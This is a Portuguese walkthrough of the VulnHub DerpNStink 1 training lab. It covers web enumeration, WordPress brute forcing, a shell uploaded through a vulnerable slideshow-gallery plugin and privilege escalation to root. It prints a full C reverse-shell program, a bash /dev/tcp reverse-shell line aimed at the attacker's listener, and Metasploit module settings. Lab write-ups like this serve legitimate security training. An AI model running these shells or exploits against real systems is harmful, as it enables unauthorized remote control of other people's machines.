---
title: "VulnHub - DerpNStink 1"
tags: [Linux,Easy,Gobuster,Worpdress,BurpSuite,Metasploit,Wireshark,Web,Brute Force]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/inicial.png)

Link: [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas aberta no servidor

> Porta 21 -> FTP

> Porta 22 -> SSH

> Porta 80 -> Web

## Enumeração da Porta 21

Tentamos login anonimo, sem sucesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp.png)

Pesquisamos por exploit para a versão 3.0.2 do vsFTPD, sem sucesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp1.png)

Vamos prosseguir

## Enumeração da Porta 80

Primeira coisa é abrirmos a página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/web.png)

Encontramos uma flag?! Lá no código fonte da página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/web2.png)

E deixar o gobuster fazendo seu serviço

```bash
gobuster dir -u http://192.168.56.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/gobuster.png)

Encontramos várias páginas

```
/weblog (Status: 301)
/php (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/temporary (Status: 301)
/server-status (Status: 403)
/robots.txt (Status: 200)
```

No nmap já vimos que temos duas entradas pro **robots.txt**, confirmamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/web3.png)

Vamos lá

### /php/

Acessamos, e deu acesso negado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/php.png)

Gobuster nele

```bash
gobuster dir -u http://192.168.56.114/php/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/gobuster1.png)

Acessamos o /phpmyadmin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/php1.png)

Show, encontramos isso... vamos prosseguir

Tentamos as credenciais padrão do mysql, **root:mysql** e conseguimos entrar!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/myadmin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/myadmin1.png)

Tentamos verificar se a versão do **phpmyadmin** é vulnerável, mas não conseguimos muito sucesso nessa exploração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/myadmin2.png)

O que conseguimos de interessante, dentro das databases conseguimos ver os usuários e os hashes deles, e consequentemente podemos fazer a alteração da senha deles também... que é o caso que vamos fazer aqui para exemplificar isso

Aqui acessamos o local onde as senhas estão salvas no wordpress (database)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha.png)

#### Alterar senha

Vamos colocar a senha dele como **senha**, como sabemos que ém php, devemos gerar uma tal

**echo password_hash('senha',PASSWORD_DEFAULT);**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha1.png)

Jogamos lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha2.png)

Senha alterada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha3.png)

Agora tentamos logar no wordpress com as credenciais trocadas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha5.png)

Sim, nós ainda "não descobrimos" o wordpress, fiz aqui apenas como algo a mais para exploração, agora vamos prosseguir na enumeração antes de ganhar o reverse shell na máquina (que daria pra fazer aqui direto já)

### /temporary/

Acessamos, e deu acesso 'try harder'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/temporary.png)

Gobuster nele

```bash
gobuster dir -u http://192.168.56.114/temporary/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/gobuster2.png)

Nada de importante... vamos para o ultimo que interessa, o /weblog

### /weblog/

Acessamos ele pelo navegador

E a primeira coisa que chamou atenção foi o fato dele resolver o IP para o nome

**http://192.168.56.114/weblog/**

Para

**http://derpnstink.local/weblog/**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/weblog.png)

Consequentemente ele não vai achar, temos que colocar no nosso /etc/hosts a entrada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/hosts.png)

Agora ele achou! Pq conseguiu resolver o nome corretamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/weblog1.png)

Vamos verificar no BurpSuite como está sendo essa requisição pra melhor entender isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/burp1.png)

Jogamos para o repeater e alteramos o HOST para o IP mesmo, pra ver o tratamento dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/burp2.png)

Verificamos na resposta (após dar Follow Redirection) algo estranho

Ele fala de um **slideshow-gallery** com um shell.php lá, mas não tem nada... bom, vamos prosseguir

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/gobuster4.png)

Gobuster nele pra não perder o costume também

```bash
gobuster dir -u http://derpnstink.local/weblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/gobuster3.png)

Verificamos que é um WordPress que está sendo executado ai!

#### Wpscan

Iniciamos a enumeração do WordPress

```bash
wpscan --url http://derpnstink.local/weblog/ --enumerate u
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/wpscan.png)

Encontramos dois usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/wpscan1.png)

Realizamos um BruteForce nesses dois usuários

```bash
wpscan --url http://derpnstink.local/weblog/ -U users.txt -P senhas.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/wpscan2.png)

Encontramos a senha padrão do admin, que é admin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/wpscan3.png)

Também encontramos um plugin desatualizado **slideshow-gallery** ... Bom ponto de vulnerabilidade

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/wpscan4.png)

Vamos explorar então...

# Reverse Shell

Primeiro modo que vou fazer é através de um exploit já pronto

## Exploit

Pesquisamos por exploits pra ele, e encontramos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search1.png)

Copiamos ele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search2.png)

Bom, agora copiamos o reverse shell que será adicionado lá, lembrando de trocar o ip e a porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search3.png)

Agora fazemos o upload dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search5.png)

Agora pegamos o reverse shell 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/search6.png)

## Metasploit Framework

Utilizamos o módulo para exploração

```bash
use exploit/unix/webapp/wp_slideshowgallery_upload
set rhosts derpnstink.local
set lhost 192.168.56.102
set wp_user admin
set wp_password admin
set target 0
set targeturi /weblog/
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/mao.png)

## Manual

Vamos fazer agora de forma manual

Após logarmos vamos na aba de **Add New**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual2.png)

Modificamos as configurações a adicionamos nosso reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual.png)

Adicionado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual3.png)

Agora abrimos ele e ganhamos a reverse shell

Clicamos na foto que foi adicionada (na verdade é um reverse shell)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/manual5.png)

Vamos iniciar a escalação de privilégio

# www-data -> stinky

Encontramos a senha do banco da dados dentro do **/var/www/html/weblog/wp-config.php**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/db1.png)

Logamos no mysql

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/db.png)

Lembrando, iremos encontrar as mesmas databases que encontramos no phpmyadmin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/senha.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/hash.png)

Tentamos quebrar essa senha com o john

**john hash.txt --wordlist=senhas.txt**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/john.png)

Verificamos quais usuários tem shell nessa máquinas, e encontramos esse **stink** que tem como descrição Uncle Stinky

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/passwd.png)

Será que ele reutiliza senhas?

```bash
su stinky
wedgie57
```

Sim!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/passwd2.png)

## Wordpress

Agora logamos no wordpress com esse usuário, pra ver se temos algo lá dentro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word1.png)

Encontramos mais uma flag... a segunda

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/word3.png)

# Stinky -> mrderp

Verificamos algo de diferente na raiz do servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/support.png)

O pastebin diz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/paste.png)

Bom, não precisamos mais dizer nada, devemos pegar o usuário **mderp** pra podermos executar comandos de root

O nosso usuário não tem essas permissões

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/paste1.png)

## Enumeração do FTP (Novamente)

Bom, já que temos uma credenciais a mais de um usuário, que tal tentarmos enumerar o ftp dele?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp2.png)

Bom, vimos que é possível acessar essa pasta, agora vamos pelo terminal normal por que é melhor de vizualizar

Verificamos um arquivo de texto em **network-logs**

Falando sobre captura de tráfego... interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp3.png)

Uma chave ssh?!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp4.png)

Tentamos logar como **mderp** e não deu em nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp5.png)

Mas conseguimos logar como **stinky**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/ftp6.png)

Pegamos a 3 flag na pasta Desktop

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/flag3.png)

## Encontrando o pcap

Dentro da pasta Documentos, temos um pcap, que chamou atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap.png)

Lemos ele

Pelo próprio terminal

```bash
tcpdump -qns 0 -X -r ./derpissues.pcap >> ./derpissues.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap1.png)

Também podemos fazer isso pelo Wireshark

Passamos o arquivo para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap2.png)

Abrimos com o Wireshark

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap3.png)

Achamos a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/pcap4.png)

# Mrderp -> Root

Logamos como **mrderp**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/derp.png)

Verificamos que ele pode executar comandos como root

## 1º Modo - Compilando um Binário

Primeiro vamos compilar um binário em C pra nos dar um shell

derp.c
```c
#include <stdio.h>
#include <sys/socket.h>              
#include <sys/types.h>                      
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>                             
#include <arpa/inet.h>                                                                    
int main(void){                                                                                                                                                                                                  
    int port = 55135;                                                                                                                                                                                            
    struct sockaddr_in revsockaddr;
                                                    
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.56.102");                                          

    connect(sockt, (struct sockaddr *) &revsockaddr,                                                    
    sizeof(revsockaddr));                           
    dup2(sockt, 0);                                                                                                                                                                                              
    dup2(sockt, 1);                                                                                     
    dup2(sockt, 2);                                                                                     
                                                                                                        
    char * const argv[] = {"/bin/sh", NULL};        
    execve("/bin/sh", argv, NULL);                                                                      

    return 0;       
}
```

```bash
gcc derp.c -o derpy
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/bina.png)

Executamos e somos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/bina1.png)

## 2º Modo - Shell normal

Também podemos fazer com scripts, sem precisar compilar, pois as vezes não vamos ter o gcc na máquina pra compilar

derpy.sh
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.102/55135 0>&1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/derp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/derp3.png)

Agora pegamos a ultima flag, a do root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-derpnstink/root.png)


